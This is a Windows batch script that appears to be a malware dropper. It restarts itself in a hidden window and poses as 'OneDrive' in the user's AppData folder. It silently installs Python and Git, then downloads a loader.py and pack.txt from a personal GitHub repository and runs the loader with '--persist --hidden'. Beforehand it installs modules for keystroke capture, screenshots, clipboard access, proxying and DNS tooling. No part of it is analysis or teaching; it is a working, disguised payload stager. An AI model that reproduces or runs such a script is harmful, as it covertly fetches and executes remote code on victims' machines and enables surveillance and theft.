@echo off
setlocal EnableDelayedExpansion

REM ====================================================
REM Check if already restarted in hidden mode
REM ====================================================
if "%~1" neq "hidden" (
    powershell -NoProfile -Command "Start-Process -FilePath '%~f0' -ArgumentList 'hidden' -WindowStyle Hidden"
    exit /B
)

REM ====================================================
REM Configuration
REM ====================================================
set "appName=OneDrive"
set "appDataDir=%APPDATA%\%appName%"
set "pythonVersion=3.13.2"
set "pythonInstallerUrl=https://www.python.org/ftp/python/%pythonVersion%/python-%pythonVersion%-amd64.exe"
set "gitVersion=2.49.0"
set "GitInstallerUrl=https://github.com/git-for-windows/git/releases/download/v%gitVersion%.windows.1/Git-%gitVersion%-64-bit.exe"
set "loaderUrl=https://raw.githubusercontent.com/glyme6139/glyme6139/refs/heads/test/loader.py"
set "packUrl=https://raw.githubusercontent.com/glyme6139/glyme6139/refs/heads/test/pack.txt"
set "tempDir=%TEMP%\%appName%"

REM Loader Arguments (Customize these as needed)
set "loaderArgs=--persist --hidden"




REM ====================================================
REM Create temporary directory
REM ====================================================
mkdir "%tempDir%" 2>nul

echo Checking for Python %pythonVersion%...

REM ====================================================
REM Detect existing Python installations excluding Microsoft Store launcher
REM ====================================================
set "pythonPath="
for /f "delims=" %%P in ('where python 2^>nul') do (
    echo %%P | find /I "WindowsApps" >nul
    if errorlevel 1 (
        for /f "tokens=2 delims= " %%V in ('"%%P" --version 2^>nul') do (
            if "%%V"=="%pythonVersion%" (
                set "pythonPath=%%P"
                goto :FoundPython
            )
        )
    )
)
:FoundPython

if defined pythonPath (
    echo Found Python %pythonVersion% at %pythonPath%.
) else (
    echo Python %pythonVersion% not found. Downloading and installing...
    set "pythonInstallerPath=%TEMP%\python-installer.exe"
    "%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -Command "Invoke-WebRequest -Uri '%pythonInstallerUrl%' -OutFile '!pythonInstallerPath!'"
    if not exist "!pythonInstallerPath!" (
        echo Failed to download Python installer.
        exit /B 1
    )
    echo Installing Python %pythonVersion%...
    "!pythonInstallerPath!" InstallAllUsers=0 PrependPath=1 Include_launcher=0 TargetDir="%LOCALAPPDATA%\Programs\Python\Python%pythonVersion%" /quiet
    if %ERRORLEVEL% neq 0 (
        echo Python installation failed.
        exit /B 1
    )
    set "pythonPath=%LOCALAPPDATA%\Programs\Python\Python%pythonVersion%\python.exe"
    echo Python installed to %pythonPath%.
)

goto :gitInstall

:gitInstall
REM ====================================================
REM Detect or install Git
REM ====================================================
call :isInstalled git
if %ERRORLEVEL%==0 (
    goto :loader
)

echo Git not found. Downloading and installing...
set "gitInstallerPath=%tempDir%\git-installer.exe"
call :downloadFile "%gitInstallerUrl%" "%gitInstallerPath%"
if %ERRORLEVEL% neq 0 (
    echo Failed to download Git installer.
    exit /b 1
)
echo Installing Git...
"%gitInstallerPath%" /SP- /VERYSILENT /NOCANCEL /NORESTART
if %ERRORLEVEL% neq 0 (
    echo Git installation failed.
    exit /b 1
)
echo Git installation complete.


:loader
REM ====================================================
REM Prepare App Data Directory and Download Files
REM ====================================================
mkdir "%appDataDir%" 2>nul
cd "%appDataDir%"

set "loaderPath=%appDataDir%\loader.py"
set "packPath=%appDataDir%\pack.txt"
call :downloadFile "%loaderUrl%" "%loaderPath%"
call :downloadFile "%packUrl%" "%packPath%"

REM ====================================================
REM Install Python modules using explicit pythonPath
REM ====================================================
echo Installing Python modules...
"%pythonPath%" -m pip install --upgrade pip
if %ERRORLEVEL% neq 0 (
    echo Failed to upgrade pip.
    exit /b 1
)
"%pythonPath%" -m pip install cryptography dnslib dnspython gitpython keyboard pyautogui pycryptodome pywin32 tqdm pyperclip PySocks wmi psutil
if %ERRORLEVEL% neq 0 (
    echo Failed to install Python modules.
    exit /b 1
)
echo Python modules installed.

REM ====================================================
REM Run the loader script
REM ====================================================
echo Starting loader...
"%pythonPath%" "%loaderPath%" %loaderArgs%

echo Script completed.
:end
REM Optional clean up: rmdir /s /q "%tempDir%"

endlocal
exit /b 0


:downloadFile
REM DownloadFile helper function
REM Parameters: %1 = URL, %2 = destination path
"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -Command "Invoke-WebRequest -Uri '%~1' -OutFile '%~2'"
if not exist "%~2" (
    echo Download failed: %~1
    exit /b 1
)
exit /b 0

:isInstalled
REM isInstalled helper function
REM Parameter: %1 = program to check via where
where %~1 >nul 2>&1
if %ERRORLEVEL%==0 (
    echo %~1 is already installed.
    exit /b 0
)
exit /b 1
